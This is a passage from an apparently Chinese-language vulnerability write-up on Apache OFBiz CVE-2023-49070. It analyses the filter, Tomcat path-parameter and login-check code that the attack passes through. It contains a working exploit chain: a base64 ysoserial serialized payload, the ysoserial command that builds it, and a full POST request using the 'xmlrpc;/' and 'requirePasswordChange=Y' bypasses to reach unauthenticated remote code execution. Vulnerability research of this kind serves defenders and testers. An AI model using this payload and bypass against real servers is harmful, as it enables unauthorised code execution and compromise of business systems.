JpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDk3OTQ2MTA4NzQyNjI1AQAgTHlzb3NlcmlhbC9Qd25lcjQ5Nzk0NjEwODc0MjYyNTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>


<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-debug-xmlrpc-equals.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上关键代码，当小写的<code>uri</code>路径为<code>/control/xmlrpc</code>时，便会继续判断请求正文中是否包含<code>&lt;/serializable</code>关键词，若存在，则会报内容未经授权，并返回空，这样请求就无法到达<code>chain.doFilter</code>进行后续的操作。所以，这里的请求路径既不能完全等于<code>/control/xmlrpc</code>，又要能够到达<code>/control/xmlrpc</code>路由。</p>
<p>在做下一步分析前，先来了解下OFBiz所使用的容器Tomcat，它对于路径参数的解析过程，代码位于<code>org.apache.catalina.connector.CoyoteAdapter</code>类中的<code>parsePathParameters</code>方法，该方法负责解析请求URI中的路径参数。</p>
<blockquote>
<p>路径参数通常出现在URL中的分号<code>;</code>后面，用于传递有关所请求资源的附加信息。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parsePathParameters</span><span class="params">(org.apache.coyote.Request req, Request request)</span> &#123;</span><br><span class="line">    <span class="comment">// Process in bytes (this is default format so this is normally a NO-OP</span></span><br><span class="line">    req.decodedURI().toBytes();</span><br><span class="line">    <span class="type">ByteChunk</span> <span class="variable">uriBC</span> <span class="operator">=</span> req.decodedURI().getByteChunk();</span><br><span class="line">    <span class="comment">// The first character must always be &#x27;/&#x27; so start search at position 1.</span></span><br><span class="line">    <span class="comment">// If the first character is &#x27;;&#x27; the URI will be rejected at the</span></span><br><span class="line">    <span class="comment">// normalization stage</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolon</span> <span class="operator">=</span> uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// Performance optimisation. Return as soon as it is known there are no</span></span><br><span class="line">    <span class="comment">// path parameters;</span></span><br><span class="line">    <span class="keyword">if</span> (semicolon == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// What encoding to use? Some platforms, eg z/os, use a default</span></span><br><span class="line">    <span class="comment">// encoding that doesn&#x27;t give the expected result so be explicit</span></span><br><span class="line">    <span class="type">Charset</span> <span class="variable">charset</span> <span class="operator">=</span> connector.getURICharset();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> (semicolon &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Parse path param, and extract it from the decoded request URI</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> uriBC.getStart();</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> uriBC.getEnd();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">pathParamStart</span> <span class="operator">=</span> semicolon + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pathParamEnd</span> <span class="operator">=</span></span><br><span class="line">                ByteChunk.findBytes(uriBC.getBuffer(), start + pathParamStart, end, <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">pv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (pathParamEnd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart, pathParamEnd - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Extract path param from decoded request URI</span></span><br><span class="line">            <span class="type">byte</span>[] buf = uriBC.getBuffer();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; end - start - pathParamEnd; i++) &#123;</span><br><span class="line">                buf[start + semicolon + i] = buf[start + i + pathParamEnd];</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setBytes(buf, start, end - start - pathParamEnd + semicolon);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="literal">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> <span class="title class_">String</span>(uriBC.getBuffer(), start + pathParamStart, (end - start) - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setEnd(start + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (pv != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">equals</span> <span class="operator">=</span> pv.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (equals &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pv.substring(<span class="number">0</span>, equals);</span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> pv.substring(equals + <span class="number">1</span>);</span><br><span class="line">                request.addPathParameter(name, value);</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, semicolon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法会查找URI中第一个<code>;</code>的索引，如果不存在<code>;</code>则直接返回。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/tomcat-parsepathparameters-uribc-indexof.png"></p>
<p>如果存在<code>;</code>字符，则进入循环对每个路径参数进行处理，将会查找每个路径参数在URI中的起始和结束位置，将路径参数值提取为字符串。随后删除已处理的路径参数，对URI进行修改，从而更新<code>uriBC</code>以排除路径参数。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/tomcat-parsepathparameters-semicolon.png"></p>
<p>最终，URI由起初的<code>/webtools/control/xmlrpc;/</code>变成了<code>/webtools/control/xmlrpc</code>，这样通过添加路径参数符的方式，也就能够达到绕过目的。如下图，请求顺利到达<code>chain.doFilter</code>，交由其进行处理。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-cachefilter-dofilter.png"></p>
<p>继续往下，请求将会到达<code>org.apache.ofbiz.webapp.control.ControlServlet#doGet</code>方法。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-controlservlet-doget.png"></p>
<p>根据web.xml中的映射关系，可知请求<code>/control/xmlrpc</code>，会由<code>ControlServlet</code>，这也再次印证了如上绕过方式是正确的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但回到BurpSuite，发现漏洞并未利用成功，而是跳转到了登录页面。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-webtools-login.png"></p>
<p>这也就是第二个限制，针对CVE-2020-9496漏洞的补丁，官方是通过增加auth来进行鉴权的，如下是controller.xml文件中的相关配置。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;xmlrpc&quot;</span> <span class="attr">track-serverhit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">track-visit</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;xmlrpc&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当auth为true时，如果在未登录状态下进行请求，将会被转发到登录页面。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:attribute</span> <span class="attr">type</span>=<span class="string">&quot;xs:boolean&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> <span class="attr">default</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:annotation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xs:documentation</span>&gt;</span></span><br><span class="line">            If auth=true, when you hit the request if you are not logged in you will be forwarded to the login page.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">xs:documentation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:annotation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:attribute</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将断点打到<code>org.apache.ofbiz.webapp.control.ControlServlet#doGet</code>方法，继续朝下跟，在<code>doGet</code>方法中，请求会由<code>handler.doRequest</code>处理，进入这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// the ServerHitBin call for the event is done inside the doRequest method</span></span><br><span class="line">    handler.doRequest(request, response, <span class="literal">null</span>, userLogin, delegator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在其中会获取request-map配置，根据如上配置，<code>securityAuth</code>的值将会为<code>true</code>，这样便会进行安全检查，<code>extensionCheckLogin</code>方法将会被调用用于安全检查。而在<code>runEvent</code>方法中，会通过反射机制跳转到相应的类进行操作。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-handler-security-check.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Find the event handler and invoke an event. */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">runEvent</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">        ConfigXMLReader.Event event, ConfigXMLReader.RequestMap requestMap, String trigger)</span> <span class="keyword">throws</span> EventHandlerException &#123;</span><br><span class="line">    <span class="type">EventHandler</span> <span class="variable">eventHandler</span> <span class="operator">=</span> eventFactory.getEventHandler(event.type);</span><br><span class="line">    <span class="type">String</span> <span class="variable">eventReturn</span> <span class="operator">=</span> eventHandler.invoke(event, requestMap, request, response);</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn() || (Debug.infoOn() &amp;&amp; <span class="string">&quot;request&quot;</span>.equals(trigger))) Debug.logInfo(<span class="string">&quot;Ran Event [&quot;</span> + event.type + <span class="string">&quot;:&quot;</span> + event.path + <span class="string">&quot;#&quot;</span> + event.invoke + <span class="string">&quot;] from [&quot;</span> + trigger + <span class="string">&quot;], result is [&quot;</span> + eventReturn + <span class="string">&quot;]&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> eventReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进，进入到<code>extensionCheckLogin</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">extensionCheckLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (LoginCheck check: ServiceLoader.load(LoginCheck.class)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!check.isEnabled()) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> check.associate(request, response);</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> checkLogin(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在其中存在一个<code>checkLogin</code>方法，进入之。</p>
<p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-loginworker-checklogin.png"></p>
<p>存在一个if条件判断，这里不能使这一整条条件判断为真值，否则就会返回error。在或运算中，需确保每一项都为false，才能使整条条件判断的值为false，对于前两项判断式的值是可控为false的，现在的关键就在于第三项判断式，也就是<code>login</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check parameters</span></span><br><span class="line">username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"><span class="comment">// check session attributes</span></span><br><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">        || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">        || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make sure this attribute is not in the request; this avoids infinite recursion when a login by less stringent criteria (like not checkout the hasLoggedOut field) passes; this is not a normal circumstance but can happen with custom code or in funny error situations when the userLogin service gets the userLogin object but runs into another problem and fails to return an error</span></span><br><span class="line">    request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那便进入到<code>login</code>方法，跟到下面发现如下关键代码，当requirePasswordChange为Y时，便会返回requirePasswordChange至<code>checkLogin</code>中的条件判断语句中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">requirePasswordChange</span> <span class="operator">=</span> <span class="string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="string">&quot;requirePasswordChange&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!unpwErrMsgList.isEmpty()) &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>, unpwErrMsgList);</span><br><span class="line">    <span class="keyword">return</span>  requirePasswordChange ? <span class="string">&quot;requirePasswordChange&quot;</span> : <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样<code>&quot;error&quot;.equals(login(request, response))</code>的值就会为false，从而决定了这一整条条件判断的值为false。</p>
<h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>使用Ysoserial生成反序列化Payload。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;open -a Calculator&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\n&quot;</span> | pbcopy</span><br></pre></td></tr></table></figure>

<p>将如上生成的内容放置在如下HTTP请求正文的<code>&lt;serializable&gt;</code>中，发送请求将会执行预期的<code>open -a Calculator</code>命令。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3982</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span><span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span><span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>rce<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span 